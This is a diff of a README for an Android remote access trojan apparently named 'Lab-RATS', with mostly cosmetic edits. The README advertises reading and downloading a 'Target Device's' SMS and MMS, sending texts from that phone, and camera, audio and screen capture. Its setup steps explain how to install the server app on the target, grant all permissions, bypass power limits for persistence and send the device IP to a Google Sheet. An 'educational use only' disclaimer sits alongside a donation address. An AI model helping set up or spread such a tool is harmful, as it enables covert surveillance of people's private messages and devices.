@@ -17,12 +17,12 @@
 
 ## 🚀 The Fun Stuff
 
--   **View MMS/Picture Messages**: *(Game Changer...You're Welcome...)*
+-   **View MMS/Picture Messages**: *(Game Changer!...You're Welcome in Advance...)*
 -   -   **Browse** & **Download ANY MMS/Picture Messages** that were **Sent** or **Received** by **Target Device**. *(Unless deleted off device)*
 -   **View SMS/Text Messages & Send SMS/Text Messages**:
 -   -   **Browse** & **Copy ANY SMS/Text Messages** that were **Sent** or **Received** by **Target Device**. *(Unless deleted off device)*
 -   -   **Send Text Messages From Target Phone** to **ANY Number**.
--   **Live Screen Capture, Stream, & Record**: *(Work In Progress. All other features are working as of June,28th/2026)*
+-   **Live Screen Capture, Stream, & Record**: *(Work In Progress. All other features are working as of 06/28/2026)*
 -   -   Take **Live Screenshots**. *(WIP)*
 -   -   Capture **Live Screen** Recordings. *(WIP)*
     -   View **User Screen Activity** in **Real-Time**. *(WIP)*
@@ -45,11 +45,12 @@
 
 **Server App to Install on Target Android Phone/Tablet**
 
-<a href='https://postimg.cc/gXn4hBLP' target='_blank'><img src='https://i.postimg.cc/gXn4hBLP/RAT-app-home.jpg' border='0' alt='RAT-app-home'></a> 
+<a href='https://postimg.cc/gXn4hBLP' target='_blank'><img src='https://i.postimg.cc/gXn4hBLP/RAT-app-home.jpg' border='0' alt='RAT-app-home'></a>
+
 
 **Live Streaming Target Device on Remote Web Server from PC**
 
-<a href="https://postimg.cc/LJpWkwWh" target="_blank"><img src="https://i.postimg.cc/LJpWkwWh/Lab-RATS-WEBHomepage.png" alt="Lab-RATS-WEBHomepage"></a> <a href="https://postimg.cc/ftmztxd9" target="_blank"><img src="https://i.postimg.cc/ftmztxd9/Lab-RATS-Camera-menu.png" alt="Lab-RATS-Camera-menu"></a> <a href="https://postimg.cc/gX8zXvh6" target="_blank"><img src="https://i.postimg.cc/gX8zXvh6/Lab-RATS-Cam-record.png" alt="Lab-RATS-Cam-record"></a> <a href="https://postimg.cc/YGYrG1FG" target="_blank"><img src="https://i.postimg.cc/YGYrG1FG/Lab-RATS-Audio.png" alt="Lab-RATS-Audio"></a> <a href="https://postimg.cc/R3G2ZdXL" target="_blank"><img src="https://i.postimg.cc/R3G2ZdXL/Lab-RATS-SMS.png" alt="Lab-RATS-SMS"></a> <a href="https://postimg.cc/HcXYcQMB" target="_blank"><img src="https://i.postimg.cc/HcXYcQMB/Lab-RATS-MMS.png" alt="Lab-RATS-MMS"></a> <a href="https://postimg.cc/TKJ4tQMG" target="_blank"><img src="https://i.postimg.cc/TKJ4tQMG/Lab-RATS-Googlesheet.png" alt="Lab-RATS-Googlesheet"></a>
+<a href="https://postimg.cc/LJpWkwWh" target="_blank"><img src="https://i.postimg.cc/LJpWkwWh/Lab-RATS-WEBHomepage.png" alt="Lab-RATS-WEBHomepage"></a> <a href="https://postimg.cc/ftmztxd9" target="_blank"><img src="https://i.postimg.cc/ftmztxd9/Lab-RATS-Camera-menu.png" alt="Lab-RATS-Camera-menu"></a> <a href="https://postimg.cc/gX8zXvh6" target="_blank"><img src="https://i.postimg.cc/gX8zXvh6/Lab-RATS-Cam-record.png" alt="Lab-RATS-Cam-record"></a> <a href="https://postimg.cc/YGYrG1FG" target="_blank"><img src="https://i.postimg.cc/YGYrG1FG/Lab-RATS-Audio.png" alt="Lab-RATS-Audio"></a> <a href="https://postimg.cc/R3G2ZdXL" target="_blank"><img src="https://i.postimg.cc/R3G2ZdXL/Lab-RATS-SMS.png" alt="Lab-RATS-SMS"></a> <a href="https://postimg.cc/HcXYcQMB" target="_blank"><img src="https://i.postimg.cc/HcXYcQMB/Lab-RATS-MMS.png" alt="Lab-RATS-MMS"></a> 
 
 ---
 
@@ -95,11 +96,12 @@ During **security research**, a **fascinating behavior** in **modern Android net
 2.  **Open the app** and **grant all** requested **permissions**.
 3.  Click **"BYPASS_POWER_LIMITS"** to ensure background **persistence**.
 4.  Click **"Initialize Server"**.
-5.  The **device IP** will appear in your **Google Sheet**. Open the link to **access the control panel**.
+5.  The **Device IP** will appear in your **Google Sheet**. Open the link to **access the control panel**.
 
 ---
 
-## 📊 Google Sheet Setup
+## 📊 Google Sheet Setup  
+<a href="https://postimg.cc/TKJ4tQMG" target="_blank"><img src="https://i.postimg.cc/TKJ4tQMG/Lab-RATS-Googlesheet.png" alt="Lab-RATS-Googlesheet"></a>
 
 1. Create **Google Sheet**
 2. **Extensions** → **Apps Script**
@@ -157,7 +159,7 @@ bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
 ---
 
 ## ⚠️ Disclaimer
-This tool is for **educational and authorized security testing purposes only**. The **developers are not responsible** for **ANY misuse or damage** caused by this application. **Please use it responsibly**.
+This **tool** is for **educational** and **authorized security testing purposes only**. The **developers are NOT responsible** for **ANY** **misuse** of this application. **Please use it responsibly**. **Enjoy**!
 
 ---
 
